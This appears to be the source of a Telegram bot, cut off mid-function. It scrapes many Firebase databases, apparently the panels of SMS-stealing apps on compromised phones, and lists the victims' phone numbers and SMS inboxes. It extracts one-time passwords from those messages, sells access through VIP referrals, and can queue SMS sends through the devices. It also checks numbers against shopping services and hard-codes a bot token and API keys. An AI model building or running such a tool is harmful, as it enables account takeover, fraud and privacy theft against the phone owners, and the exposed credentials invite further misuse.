#!/usr/bin/env python3
"""
══════════════════════════════════════════════════════
  OTP PANEL BOT — ULTIMATE ENTERPRISE EDITION           
  Railway Cloud Optimized (Anti-OOM, Incremental Live Cache)
  Dynamic VIP Referrals (20->30->40) + Search Lock
  Wishlist System + Live Auto-Check Cancel + No Spam
══════════════════════════════════════════════════════
"""

import os
import sys
import re
import time
import json
import random
import asyncio
import logging
import warnings
import traceback
import gc
from datetime import datetime
from typing import Optional
import aiohttp
from aiohttp import web
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup, KeyboardButton
from telegram.error import BadRequest, Forbidden, NetworkError
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    filters,
    ContextTypes,
)

# 🛑 Suppress Warnings
warnings.filterwarnings("ignore", category=DeprecationWarning)
logging.basicConfig(format="%(asctime)s — %(levelname)s — %(message)s", level=logging.WARNING)
logging.getLogger("asyncio").setLevel(logging.CRITICAL)
logging.getLogger("aiohttp").setLevel(logging.CRITICAL)

# ═══════════════════════════════════════════════════════
#  CONFIGURATION & GLOBALS
# ═══════════════════════════════════════════════════════

PAGE_SIZE       = 20    
TOKEN           = os.getenv("BOT_TOKEN", "8751858624:AAHAA2jMVScmhYECFtLVQ-q89ImsXh6mct8")
BOT_USERNAME    = "fjjhfbot"
CHUNK_SIZE      = 20  # Safe for Railway 500MB RAM

ADMIN_IDS: set[int] = {
    6860106371,   
}

FORCE_JOIN_CHATS = [
    "@sabkijayhokhush", 
    "@leakmethodfree", 
    "@rosekhudkabanaya"
]

DB_DIR = "Panel_Databases"
USERS_DIR = os.path.join(DB_DIR, "Users")
SYS_DIR = os.path.join(DB_DIR, "System")
SMS_LOG_FILE = os.path.join(SYS_DIR, "Super_Admin_SMS_Log.txt")

_main_app: Optional[Application] = None
_http_session: Optional[aiohttp.ClientSession] = None

all_users: dict[int, dict] = {}
pending_action: dict[int, dict] = {}
user_cooldowns: dict[int, float] = {}
user_seen_unreg: dict[int, set[str]] = {}

GLOBAL_DEVICE_CACHE: dict[str, list] = {"ALL": []}
SETTINGS = {"base_price": 30, "global_panels": []}

API_LOCK = asyncio.Lock()
WORKER_SEMAPHORE = asyncio.Semaphore(100) 

scan_progress = {
    "scanned": 0,
    "total": 0,
    "is_scanning": False
}

SYS_SETTINGS = {
    "api_keys": [
        "AK_aewqEf78uV8I3V06vcEcBlESdcPGyz74", "AK_82DbShpWkA6_Ctln35D7d7jOzWOQkJk7",
        "AK_Z67i7aPkuL4Iid7Vq8OgOuJb7ewNZy4K", "AK_31Whk-_9PxJnWJMJlS0op7kcp_ESfQTv",
        "AK_RrbWlO2Ole-pJgbmsm0mDcoOXFZ_bvJ-", "AK_KYrXjwwwdLYGiGXq47FDWOoL9vvdZZmo",
        "AK_Dooy_O2elOFy57Qjzt70FEAjBQcGD8YM", "AK_jfaywkZJc6W2_JUjHKtxo3uEcJOkBNH6"
    ],
    "check_anim": "⚡"
}

RAW_URLS = [
    "https://aaaa-b3749-default-rtdb.firebaseio.com", "https://aashish-2e04c-default-rtdb.firebaseio.com",
    "https://aaya-6e335-default-rtdb.firebaseio.com", "https://aaya2-8df9a-default-rtdb.firebaseio.com",
    "https://access20-3fc38-default-rtdb.firebaseio.com", "https://activity-e16b3-default-rtdb.firebaseio.com"
]

def load_local_txt_dbs():
    loaded_urls = set()
    files_to_check = ["aiurl.txt", "All_Normal_URLs.txt", os.path.join("Extracted_URLs", "All_Normal_URLs.txt")]
    for path in files_to_check:
        if os.path.exists(path):
            try:
                with open(path, "r", encoding="utf-8") as f:
                    for line in f:
                        url = line.strip()
                        if url.startswith("http"): loaded_urls.add(url)
            except Exception: pass
    print(f"✅ Loaded {len(loaded_urls)} URLs from Local Text DBs")
    return list(loaded_urls)

RAW_URLS.extend(load_local_txt_dbs())
DATABASES = {f"P_{i}": url for i, url in enumerate(set(RAW_URLS))}

class Device:
    __slots__ = ("id", "name", "status", "battery", "timestamp", "numbers", "device_info", "sms_path", "base_url", "db_tag", "last_sms_ts")
    def __init__(self, id, name, status, battery, timestamp, numbers, device_info, sms_path, base_url, db_tag, last_sms_ts=0.0):
        self.id = id
        self.name = name
        self.status = status
        self.battery = battery
        self.timestamp = timestamp
        self.numbers = numbers
        self.device_info = device_info
        self.sms_path = sms_path
        self.base_url = base_url
        self.db_tag = db_tag
        self.last_sms_ts = last_sms_ts

def init_dirs():
    os.makedirs(USERS_DIR, exist_ok=True)
    os.makedirs(SYS_DIR, exist_ok=True)
    if not os.path.exists(SMS_LOG_FILE):
        with open(SMS_LOG_FILE, "w", encoding="utf-8") as f: f.write("--- SYSTEM MASTER SMS LOG ---\n")

def load_data():
    global all_users, SETTINGS
    init_dirs()
    local_dbs = load_local_txt_dbs()
    if local_dbs:
         existing_global = set(SETTINGS.get("global_panels", []))
         existing_global.update(local_dbs)
         SETTINGS["global_panels"] = list(existing_global)

    set_path = os.path.join(SYS_DIR, "settings.json")
    if os.path.exists(set_path):
        try:
            with open(set_path, "r", encoding="utf-8") as f: SETTINGS.update(json.load(f))
        except: pass

    for fname in os.listdir(USERS_DIR):
        if fname.endswith(".json"):
            try:
                uid = int(fname.split(".")[0])
                with open(os.path.join(USERS_DIR, fname), "r", encoding="utf-8") as f:
                    u = json.load(f)
                    u.setdefault("custom_dbs", [])
                    u.setdefault("referrals", 0)
                    u.setdefault("vip_target", 20) 
                    u.setdefault("wishlist", []) 
                    u.setdefault("coins", 0)
                    u.setdefault("vip_until", 0.0)
                    all_users[uid] = u
            except: pass
                
    for adm in ADMIN_IDS:
        if adm not in all_users:
            all_users[adm] = {
                "name": "Supreme Owner", "username": "",
                "joined_at": datetime.now().strftime("%d %b %Y %I:%M %p"),
                "verified": True, "referrals": 0, "vip_target": 20, "wishlist": [], "coins": 999999,
                "vip_until": 2e10, "custom_dbs": []
            }
            save_user(adm)

def save_user(uid: int):
    init_dirs()
    if uid in all_users:
        with open(os.path.join(USERS_DIR, f"{uid}.json"), "w", encoding="utf-8") as f:
            json.dump(all_users[uid], f, indent=4)

def save_settings():
    init_dirs()
    with open(os.path.join(SYS_DIR, "settings.json"), "w", encoding="utf-8") as f:
        json.dump(SETTINGS, f, indent=4)

async def auto_save_loop():
    while True:
        try:
            await asyncio.sleep(60)
            await asyncio.to_thread(save_settings)
            for uid in list(all_users.keys()): await asyncio.to_thread(save_user, uid)
            gc.collect()
        except: await asyncio.sleep(5)

# ═══════════════════════════════════════════════════════
#  UTILS & HTTP ENGINE
# ═══════════════════════════════════════════════════════

def get_user_dbs(uinfo: dict) -> list:
    dbs = uinfo.get("custom_dbs", [])
    valid_urls = []
    for db in dbs:
        if isinstance(db, str): valid_urls.append(db)
        elif isinstance(db, dict): valid_urls.append(db.get("url"))
    return list(set(valid_urls))

def is_spamming(user_id: int) -> bool:
    if user_id in ADMIN_IDS: return False
    now = time.time()
    if now - user_cooldowns.get(user_id, 0) < 0.2: return True
    user_cooldowns[user_id] = now
    return False

async def check_force_join(bot, user_id: int) -> bool:
    if user_id in ADMIN_IDS: return True
    for chat in FORCE_JOIN_CHATS:
        try:
            member = await bot.get_chat_member(chat, user_id)
            if member.status in ['left', 'kicked', 'banned']: return False
        except Exception: pass
    return True

async def get_http_session() -> aiohttp.ClientSession:
    global _http_session
    if _http_session is None or _http_session.closed:
        _http_session = aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=300, keepalive_timeout=30, enable_cleanup_closed=True))
    return _http_session

async def fb_get(path: str, base: str, timeout: int = 15) -> Optional[dict]:
    try:
        session = await get_http_session()
        url = f"{base}/{path}.json" if path else f"{base}/.json?shallow=true"
        if not path: url = url.replace("?shallow=true", ".json")
        async with session.get(url, timeout=aiohttp.ClientTimeout(total=timeout)) as r:
            if r.status != 200: return None
            data = await r.json(content_type=None)
            return data if isinstance(data, dict) else {}
    except: return None

async def fb_keys(path: str, base: str) -> Optional[list[str]]:
    try:
        session = await get_http_session()
        url = f"{base}/{path}.json?shallow=true" if path else f"{base}/.json?shallow=true"
        async with session.get(url, timeout=aiohttp.ClientTimeout(total=10)) as r:
            if r.status != 200: return None
            data = await r.json(content_type=None)
            return list(data.keys()) if isinstance(data, dict) else []
    except: return None

async def check_number_api(service: str, number: str, retries=3) -> dict:
    async with WORKER_SEMAPHORE: 
        clean_number = re.sub(r"\D", "", str(number))[-10:]
        api_keys = SYS_SETTINGS.get("api_keys", [])
        if not api_keys: return {"status": "error", "message": "No API Keys configured.", "ms": 0}

        for attempt in range(retries):
            async with API_LOCK:
                if not hasattr(check_number_api, 'k_idx'): check_number_api.k_idx = 0
                selected_key = api_keys[check_number_api.k_idx % len(api_keys)]
                check_number_api.k_idx += 1

            payload = {"service": service.lower(), "number": clean_number}
            start_req = time.time()
            try:
                session = await get_http_session()
                async with session.post("https://superassets.in/api/v1/check", json=payload, headers={"X-API-Key": selected_key, "Content-Type": "application/json"}, timeout=aiohttp.ClientTimeout(total=15)) as r:
                    req_ms = int((time.time() - start_req) * 1000)
                    if r.status == 200: 
                        res = await r.json()
                        res["ms"] = req_ms
                        return res
                    elif r.status == 429:
                        await asyncio.sleep(1.5 * (attempt + 1))
                        continue
                    else: return {"status": "error", "message": f"HTTP {r.status}", "ms": req_ms}
            except: 
                if attempt == retries - 1: return {"status": "error", "message": "Timeout", "ms": int((time.time() - start_req) * 1000)}
                await asyncio.sleep(1)

async def fb_send_sms(device, to_number: str, msg: str):
    async with WORKER_SEMAPHORE:
        try:
            base_node = device.sms_path.replace("/sms", "").replace("user_sms", "user_data")
            send_url = f"{device.base_url}/{base_node}/sendSMS.json"
            payload = {"number": to_number, "phone": to_number, "phoneNo": to_number, "message": msg, "msg": msg, "text": msg, "status": "pending"}
            session = await get_http_session()
            async with session.post(send_url, json=payload, timeout=aiohttp.ClientTimeout(total=5)) as r: pass
        except: pass

async def verify_recent_sms(device, max_age_sec=1800) -> tuple[bool, float]:
    try:
        session = await get_http_session()
        url = f"{device.base_url}/{device.sms_path}.json?orderBy=\"$key\"&limitToLast=2"
        async with session.get(url, timeout=aiohttp.ClientTimeout(total=5)) as r:
            if r.status == 200:
                data = await r.json(content_type=None)
                if isinstance(data, dict) and len(data) > 0:
                    max_sms_ts = 0
                    for k, sms_val in data.items():
                        if isinstance(sms_val, dict):
                            t_val = sms_val.get("timestamp") or 0
                            try:
                                t_float = float(t_val)
                                if t_float > 1e11: t_float /= 1000
                                if t_float > max_sms_ts: max_sms_ts = t_float
                            except: pass
                    if max_sms_ts > 0 and (time.time() - max_sms_ts) <= max_age_sec: return True, max_sms_ts
                    return False, max_sms_ts
    except: pass
    return False, 0.0

# ═══════════════════════════════════════════════════════
#  FORMATTERS & MENUS
# ═══════════════════════════════════════════════════════

def get_checker_menu(prefix="chk_srv:"):
    kb = [
        [InlineKeyboardButton("🥬 Bigbasket", callback_data=f"{prefix}bigbasket"), InlineKeyboardButton("🛍️ Meesho", callback_data=f"{prefix}meesho"), InlineKeyboardButton("🪐 Plutos", callback_data=f"{prefix}plutos")],
        [InlineKeyboardButton("⭐ Starexch", callback_data=f"{prefix}starexch"), InlineKeyboardButton("🍔 Swiggy", callback_data=f"{prefix}swiggy"), InlineKeyboardButton("🛒 Flipkart", callback_data=f"{prefix}flipkart")],
        [InlineKeyboardButton("👗 Shein", callback_data=f"{prefix}shein"), InlineKeyboardButton("👚 Myntra", callback_data=f"{prefix}myntra"), InlineKeyboardButton("🏨 Oyo", callback_data=f"{prefix}oyo")],
        [InlineKeyboardButton("🏢 Mantrimall", callback_data=f"{prefix}mantrimall"), InlineKeyboardButton("🟡 Blinkit", callback_data=f"{prefix}blinkit")],
        [InlineKeyboardButton("🛏️ Brevistay", callback_data=f"{prefix}brevistay"), InlineKeyboardButton("⚡ Ajio", callback_data=f"{prefix}ajio"), InlineKeyboardButton("📦 Amazon", callback_data=f"{prefix}amazon")],
        [InlineKeyboardButton("📱 MyJio", callback_data=f"{prefix}myjio"), InlineKeyboardButton("👓 Lenskart", callback_data=f"{prefix}lenskart")],
        [InlineKeyboardButton("❌ Close", callback_data="close_msg")]
    ]
    return InlineKeyboardMarkup(kb)

def format_checker_result(service: str, number: str, is_reg: bool, ms: int, is_error: bool = False, err_msg: str = ""):
    srv_name, emoji = service.capitalize(), "✨"
    display_num = number if str(number).startswith("+") else f"+{number}"
    if is_error: return f"⚠️ <b>ERROR</b>\n\n{emoji} <b>{srv_name}</b>\n📱 {display_num}\n⚡ {ms} ms\n\n<i>{err_msg}</i>"
    return f"<b>{'✅ REGISTERED' if is_reg else '❌ UNREGISTERED'}</b>\n\n{emoji} <b>{srv_name}</b>\n📱 {display_num}\n⚡ {ms} ms"

def get_reply_menu(chat_id: int) -> ReplyKeyboardMarkup:
    keys = [
        [KeyboardButton("🌐 Global Devices List"), KeyboardButton("🔍 Search Number")],
        [KeyboardButton("⭐ My Wishlist"), KeyboardButton("⚡ Auto-Check Panels")],
        [KeyboardButton("Manual Checker"), KeyboardButton("Add Custom Panel")],
        [KeyboardButton("Delete Custom Panel"), KeyboardButton("🎁 Refer & Earn VIP")],
        [KeyboardButton("Help / Get Panels")]
    ]
    if chat_id in ADMIN_IDS: keys.append([KeyboardButton("Admin Panel")])
    return ReplyKeyboardMarkup(keys, resize_keyboard=True)

def device_list_header(devices: list[Device], page: int = 0, title="OTP PANEL PRO") -> str:
    online  = sum(1 for d in devices if d.status == "online")
    offline = len(devices) - online
    total_pages = max(1, (len(devices) + PAGE_SIZE - 1) // PAGE_SIZE)
    
    sync_status = ""
    if scan_progress.get("is_scanning"):
        scanned = scan_progress.get("scanned", 0)
        total = scan_progress.get("total", 0)
        pct = int((scanned/total)*100) if total > 0 else 0
        sync_status = f"\n⚠️ **Live Syncing:** {scanned}/{total} DBs loaded ({pct}%)..."
        
    return f"{title}\n━━━━━━━━━━━━━━━━━━\nOnline: {online}   Offline: {offline}\nTotal: {len(devices)} Devices\nPage {page + 1} of {total_pages}{sync_status}\n━━━━━━━━━━━━━━━━━━\nSelect a number below:"

def device_list_keyboard(devices: list[Device], page: int = 0) -> InlineKeyboardMarkup:
    total_pages = max(1, (len(devices) + PAGE_SIZE - 1) // PAGE_SIZE)
    page = max(0, min(page, total_pages - 1))
    start = page * PAGE_SIZE
    page_devs = devices[start : start + PAGE_SIZE]
    rows = []
    for d in page_devs:
        tag  = f"[{d.db_tag}] "
        icon = "🟢" if d.status == "online" else "🔴"
        if d.numbers:
            lbl = f"{icon} {tag}{d.numbers[0]}"
            if len(d.numbers) > 1: lbl += f" & {d.numbers[1]}"
        else:
            lbl = f"{icon} {tag}{d.name} ({d.id[:6]})"
        rows.append([InlineKeyboardButton(lbl, callback_data=f"sel:{d.id}")])
    nav = []
    if page > 0: nav.append(InlineKeyboardButton("Prev", callback_data=f"pg:{page - 1}"))
    nav.append(InlineKeyboardButton(f"{page + 1}/{total_pages}", callback_data="noop"))
    if page < total_pages - 1: nav.append(InlineKeyboardButton("Next", callback_data=f"pg:{page + 1}"))
    rows.append(nav)
    rows.append([InlineKeyboardButton("🔄 Refresh List", callback_data="home"), InlineKeyboardButton("Online Only", callback_data="online")])
    rows.append([InlineKeyboardButton("Close", callback_data="close_msg")])
    return InlineKeyboardMarkup(rows)

def online_only_keyboard(devices: list[Device]) -> InlineKeyboardMarkup:
    online = [d for d in devices if d.status == "online"]
    rows = []
    if online:
        for d in online:
            tag = f"[{d.db_tag}] "
            if d.numbers:
                lbl = f"🟢 {tag}{d.numbers[0]}"
                if len(d.numbers) > 1: lbl += f" & {d.numbers[1]}"
            else:
                lbl = f"🟢 {tag}{d.name} ({d.id[:6]})"
            rows.append([InlineKeyboardButton(lbl, callback_data=f"sel:{d.id}")])
    else:
        rows.append([InlineKeyboardButton("No devices online", callback_data="noop")])
    rows.append([InlineKeyboardButton("Refresh", callback_data="online"), InlineKeyboardButton("All Numbers", callback_data="pg:0")])
    rows.append([InlineKeyboardButton("Close", callback_data="close_msg")])
    return InlineKeyboardMarkup(rows)

def fmt_num(n: str) -> str:
    c = re.sub(r"\D", "", str(n))
    if c.startswith("91") and len(c) == 12: return f"+{c}"
    if len(c) == 10: return f"+91{c}"
    if len(c) > 4: return f"+{c}"
    return c

def extract_all_nums(*dicts) -> list[str]:
    nums = []
    keys_to_check = ["sim1Number", "sim2Number", "numberSim1", "numberSim2", "mobNo", "phoneNumber", "phone", "sim1", "sim2", "mobile"]
    for d in dicts:
        if not isinstance(d, dict): continue
        for k in keys_to_check:
            val = str(d.get(k, ""))
            if val and len(re.sub(r"\D", "", val)) > 4: nums.append(fmt_num(val))
    return list(set(nums))

def bat_emoji(pct: int) -> str: return "🔋" if pct >= 20 else "🪫"

OTP_PATTERNS = [re.compile(r"OTP[^\d]*(\d{4,8})", re.IGNORECASE), re.compile(r"code[^\d]*(\d{4,8})", re.IGNORECASE), re.compile(r"\b(G-\d{6})\b", re.IGNORECASE), re.compile(r"\b(\d{6})\b"), re.compile(r"\b(\d{4})\b")]

def extract_otp(text: str) -> Optional[str]:
    for pat in OTP_PATTERNS:
        m = pat.search(text)
        if m: return m.group(1)
    return None

def parse_battery(val) -> int:
    if isinstance(val, (int, float)): return int(val)
    if isinstance(val, str):
        digits = re.sub(r"\D", "", val)
        return int(digits) if digits else 0
    return 0

def parse_status_str(val) -> str: return "online" if str(val).lower() == "online" else "offline"
def parse_status_bool(val) -> str: return "online" if val is True else "offline"

def sms_date(sms: dict) -> str:
    date_str = sms.get("date") or sms.get("receivedDate") or sms.get("recivedDate")
    if date_str: return date_str
    if sms.get("timestamp"):
        try:
            ts = float(sms["timestamp"])
            if ts > 1e11: ts /= 1000
            return datetime.fromtimestamp(ts).strftime("%d %b %I:%M %p")
        except: pass
    return "N/A"

def format_sms_block_markdown(sms: dict) -> tuple[str, Optional[str]]:
    body = sms.get("body") or sms.get("message") or sms.get("text") or ""
    otp = extract_otp(body)
    date = sms_date(sms)
    sender = sms.get("sender") or "Unknown"
    if otp: block = f"🔹 **From:** `{sender}`\n📅 **Date:** {date}\n🔑 **OTP:** `{otp}`\n✉️ **Msg:** {body}"
    else: block = f"🔹 **From:** `{sender}`\n📅 **Date:** {date}\n✉️ **Msg:** {body}"
    return block, otp

async def safe_edit(query, text, reply_markup=None, parse_mode=None, disable_web_page_preview=False):
    try: await query.edit_message_text(text, reply_markup=reply_markup, parse_mode=parse_mode, disable_web_page_preview=disable_web_page_preview)
    except BadRequest: pass
    except Exception: pass

# ═══════════════════════════════════════════════════════
#  SHADOW CACHING FETCHERS 
# ═══════════════════════════════════════════════════════

async def fetch_db_data_task(tag: str, url: str, results_list: list):
    try:
        devices_list = []
        added_set = set()
        root_keys, sim_all, device_info_all, user_data_all, clients_all = await asyncio.gather(
            fb_keys("", url), fb_get("All_Users/simDetails", url), fb_get("All_Users/Data/DeviceInfo", url),
            fb_get("user_data", url), fb_get("clients", url)
        )
            
        if sim_all and isinstance(sim_all, dict):
            info_all = device_info_all or {}
            for dev_id, sim in sim_all.items():
                if dev_id in added_set: continue
                added_set.add(dev_id)
                info = info_all.get(dev_id) or {}
                nums = extract_all_nums(sim, info)
                model = info.get("DeviceModel") or info.get("Brand") or f"Device-{dev_id[:6]}"
                devices_list.append(Device(id=dev_id, name=model, status=parse_status_str(info.get("Status")), battery=parse_battery(info.get("Battery")), timestamp=int(info.get("currentTimeMillis") or sim.get("timestamp") or 0), numbers=nums, device_info=f"Model: {model}\nDevice ID: {dev_id}", sms_path=f"All_Users/sms/{dev_id}", base_url=url, db_tag=tag))
        
        if user_data_all and isinstance(user_data_all, dict):
            for dev_id, data in user_data_all.items():
                if dev_id in added_set: continue
                if not isinstance(data, dict): continue
                added_set.add(dev_id)
                nums = extract_all_nums(data)
                devices_list.append(Device(id=dev_id, name=data.get("d_name") or f"Device-{dev_id[:6]}", status=parse_status_str(data.get("status")), battery=parse_battery(data.get("battery")), timestamp=int(data.get("timestamp") or 0), numbers=nums, device_info=data.get("Device_info") or f"Device ID: {dev_id}", sms_path=f"user_sms/{dev_id}", base_url=url, db_tag=tag))
        
        if clients_all and isinstance(clients_all, dict):
            for dev_id, client in clients_all.items():
                if dev_id in added_set: continue
                if not isinstance(client, dict): continue
                sim_list = client.get("sims", [])
                s1 = sim_list[0] if isinstance(sim_list, list) and len(sim_list) > 0 else {}
                s2 = sim_list[1] if isinstance(sim_list, list) and len(sim_list) > 1 else {}
                nums = extract_all_nums(client, s1, s2)
                if not nums and not client.get("modelName"): continue
                added_set.add(dev_id)
                model = client.get("modelName") or f"Device-{dev_id[:6]}"
                devices_list.append(Device(id=dev_id, name=model, status=parse_status_bool(client.get("status")), battery=parse_battery(client.get("battery")), timestamp=0, numbers=nums, device_info=f"Model: {model}\nDevice ID: {dev_id}", sms_path=f"All_Users/sms/{dev_id}", base_url=url, db_tag=tag))
                
        if devices_list: results_list.extend(devices_list)
    except Exception: pass
    finally: scan_progress["scanned"] += 1

async def _update_global_cache():
    global scan_progress
    dbs_to_poll = dict(DATABASES)
    for i, g_url in enumerate(SETTINGS.get("global_panels", [])):
        dbs_to_poll[f"G_{i}"] = g_url

    items = list(dbs_to_poll.items())
    scan_progress["total"] = len(items)
    scan_progress["scanned"] = 0
    scan_progress["is_scanning"] = True
    
    # Preserve existing cache to prevent list size from dropping to 0
    existing_devices = {d.id: d for d in GLOBAL_DEVICE_CACHE.get("ALL", [])}
    
    for i in range(0, len(items), CHUNK_SIZE):
        chunk = items[i:i + CHUNK_SIZE]
        results_list = []
        tasks = [fetch_db_data_task(tag, url, results_list) for tag, url in chunk]
        await asyncio.gather(*tasks)
        
        # Merge new devices into the live pool immediately
        for d in results_list:
            existing_devices[d.id] = d
            
        unique_devices = []
        seen_numbers = set()
        
        # Filter and Push to Global Cache immediately so user sees the list growing
        for d in existing_devices.values():
            if d.numbers:
                new_nums = [num for num in d.numbers if num not in seen_numbers]
                if not new_nums: continue 
                d.numbers = new_nums
                seen_numbers.update(new_nums)
            unique_devices.append(d)

        unique_devices.sort(key=lambda d: (0 if d.status == "online" else 1, 0 if len(d.numbers) > 0 else 1, -d.timestamp))
        GLOBAL_DEVICE_CACHE["ALL"] = unique_devices[:4000] # Safe cap for Railway
        
        del results_list
        gc.collect()
        await asyncio.sleep(0.5) 
        
    scan_progress["is_scanning"] = False

async def global_cache_loop():
    while True:
        try: await _update_global_cache()
        except Exception: pass
        await asyncio.sleep(120) 

async def get_all_devices(chat_id: int = 0) -> list[Device]:
    uinfo = all_users.get(chat_id, {})
    is_vip = uinfo.get("vip_until", 0) > time.time()
    is_admin = chat_id in ADMIN_IDS
    custom_dbs = get_user_dbs(uinfo)
    
    all_cached = GLOBAL_DEVICE_CACHE.get("ALL", [])
    
    if is_admin or is_vip:
        return all_cached
    else:
        valid_tags = set()
        for i, _ in enumerate(custom_dbs): valid_tags.add(f"U_{chat_id}_{i}")
        return [d for d in all_cached if d.db_tag in valid_tags]

async def get_device_sms(device: Device, limit: int = 15) -> list[dict]:
    try:
        url = f"{device.base_url}/{device.sms_path}.json?orderBy=\"$key\"&limitToLast=30"
        data = await fb_get("", url, timeout=5)
        if not data or not isinstance(data, dict): return []
        entries = [{"_key": k, **v} for k, v in data.items() if isinstance(v, dict)]
        for s in entries:
            try:
                s["_parsed_ts"] = float(s.get("timestamp", 0))
                if s["_parsed_ts"] > 1e11: s["_parsed_ts"] /= 1000
            except: s["_parsed_ts"] = 0.0
        entries.sort(key=lambda s: s["_parsed_ts"], reverse=True)
        return entries[:limit]
    except: return []

# ═══════════════════════════════════════════════════════
#  TELEGRAM COMMAND HANDLERS
# ═══════════════════════════════════════════════════════

# 🔥 CMD ADMIN IS BACK (DO NOT DELETE)
async def cmd_admin(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    chat_id  = update.effective_chat.id
    if chat_id in ADMIN_IDS:
        kb = InlineKeyboardMarkup([
            [InlineKeyboardButton("Add Global Panel", callback_data="sa_add_global_panel")],
            [InlineKeyboardButton("View User Panels", callback_data="sa_view_user_panels")],
            [InlineKeyboardButton("Export Online Numbers", callback_data="sa_export_numbers")],
            [InlineKeyboardButton("Download SMS Logs (.txt)", callback_data="sa_download_logs")],
            [InlineKeyboardButton("Close", callback_data="close_msg")]
        ])
        await update.message.reply_text("SUPER ADMIN MENU\nChoose an advanced option:", reply_markup=kb)
    else:
        await update.message.reply_text("❌ You are not authorized.")

async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    chat_id  = update.effective_chat.id
    user = update.effective_user
    args = ctx.args

    ref_id = None
    if args and args[0].startswith("ref_"):
        try: ref_id = int(args[0].split("_")[1])
        except: pass

    if chat_id not in all_users:
        all_users[chat_id] = {
            "name": user.first_name, "username": user.username or "",
            "joined_at": datetime.now().strftime("%d %b %Y"),
            "verified": False, "referrals": 0, "vip_target": 20, "coins": 0,
            "vip_until": 0.0, "wishlist": [], "custom_dbs": [], "referred_by": None
        }
        
        # Immediate Rewards
        if ref_id and ref_id in all_users and ref_id != chat_id:
            all_users[chat_id]["referred_by"] = ref_id
            all_users[ref_id]["referrals"] += 1
            all_users[ref_id]["coins"] += 10
            
            try: await ctx.bot.send_message(ref_id, f"🎉 **NEW REFERRAL!**\nKisi ne aapke link se join kiya hai.\n💰 **+10 Coins added!**\n📊 Total Referrals: {all_users[ref_id]['referrals']}")
            except: pass
            
            target = all_users[ref_id].get("vip_target", 20)
            if all_users[ref_id]["referrals"] >= target:
                all_users[ref_id]["vip_until"] = time.time() + (24 * 3600)
                all_users[ref_id]["vip_target"] = target + 10 # Escalating Target
                try: await ctx.bot.send_message(ref_id, "🎉 **VIP UNLOCKED!**\nAapka target poora ho gaya! 24 Hours ka VIP Access mil gaya hai!", parse_mode="Markdown")
                except: pass
        save_user(chat_id)
    
    if not await check_force_join(ctx.bot, chat_id):
        join_kb = InlineKeyboardMarkup([[InlineKeyboardButton("✅ I have joined", callback_data="check_join")]])
        await update.message.reply_text("⚠️ **ACCESS DENIED**\n\nAapko bot use karne ke liye pehle Channels join karne honge.", reply_markup=join_kb, parse_mode="Markdown")
        return

    welcome_text = (
        f"🔥 **OTP PANEL PRO (ENTERPRISE EDITION)** 🔥\n━━━━━━━━━━━━━━━━━━\n"
        f"Welcome Master {user.first_name}!\n\n"
        "System is connected and fully optimized.\n"
        "🆓 **Free Users:** Custom Panels add karein.\n"
        "👑 **VIP Users:** Global Panels aur Search Number access karein."
    )
    await update.message.reply_text(welcome_text, reply_markup=get_reply_menu(chat_id), parse_mode="Markdown")

# ═══════════════════════════════════════════════════════
#  CALLBACK QUERY HANDLER
# ═══════════════════════════════════════════════════════

async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    query   = update.callback_query
    data    = query.data or ""
    chat_id = query.message.chat_id
    users_db = all_users

    try:
        if data == "check_join":
            if await check_force_join(ctx.bot, chat_id):
                await query.answer("Welcome to OTP Panel!", show_alert=True)
                await safe_edit(query, "✅ Validation Successful. Send /start to access menu.")
            else: await query.answer("Channels join nahi kiye hain!", show_alert=True)
            return

        if not await check_force_join(ctx.bot, chat_id):
            await query.answer("Aap channels se left ho gaye hain!", show_alert=True)
            return

        await query.answer()

        if data == "noop": return
        if data == "close_msg":
            try: await query.message.delete()
            except: pass
            return

        # LIVE SCAN CANCELLATION
        if data == "cancel_scan":
            if chat_id in pending_action and pending_action[chat_id].get("action") == "auto_check":
                pending_action[chat_id]["status"] = "stopped"
            await safe_edit(query, "🛑 **Scan Stopping...** Please wait.", parse_mode="Markdown")
            return

        # WISHLIST LOGIC
        if data.startswith("wish_add:"):
            dev_id = data.split(":")[1]
            wl = users_db.setdefault(chat_id, {}).setdefault("wishlist", [])
            if dev_id not in wl: wl.append(dev_id)
            save_user(chat_id)
            kb = InlineKeyboardMarkup([
                [InlineKeyboardButton("📩 View Fast Inbox", callback_data=f"msgs:{dev_id}")],
                [InlineKeyboardButton("❌ Remove from Wishlist", callback_data=f"wish_rem:{dev_id}")],
                [InlineKeyboardButton("🔙 Back to List",  callback_data="home")]
            ])
            await safe_edit(query, query.message.text, reply_markup=kb)
            return
            
        if data.startswith("wish_rem:"):
            dev_id = data.split(":")[1]
            wl = users_db.setdefault(chat_id, {}).setdefault("wishlist", [])
            if dev_id in wl: wl.remove(dev_id)
            save_user(chat_id)
            kb = InlineKeyboardMarkup([
                [InlineKeyboardButton("📩 View Fast Inbox", callback_data=f"msgs:{dev_id}")],
                [InlineKeyboardButton("⭐ Add to Wishlist", callback_data=f"wish_add:{dev_id}")],
                [InlineKeyboardButton("🔙 Back to List",  callback_data="home")]
            ])
            await safe_edit(query, query.message.text, reply_markup=kb)
            return

        # NAV & DISPLAY
        if data == "home":
            pending_action.pop(chat_id, None)
            devices = await get_all_devices(chat_id)
            await safe_edit(query, device_list_header(devices, 0), reply_markup=device_list_keyboard(devices, 0))
            return

        if data.startswith("pg:"):
            page = int(data[3:])
            devices = await get_all_devices(chat_id)
            await safe_edit(query, device_list_header(devices, page), reply_markup=device_list_keyboard(devices, page))
            return

        if data == "online":
            devices = await get_all_devices(chat_id)
            await safe_edit(query, f"ONLINE NUMBERS\n━━━━━━━━━━━━━━━━━━\nClick a number to connect:", reply_markup=online_only_keyboard(devices))
            return

        if data.startswith("cp:"):
            await query.answer(f"OTP: {data[3:]}", show_alert=True)
            return

        if data.startswith("sel:"):
            dev_id = data[4:]
            devices = GLOBAL_DEVICE_CACHE.get("ALL", [])
            device = next((d for d in devices if d.id == dev_id), None)
            if not device:
                await query.answer("Device not found!", show_alert=True)
                return
            
            label = device_label(device)
            status = "Online" if device.status == "online" else "Offline"
            bat = f"{bat_emoji(device.battery)} {device.battery}%"
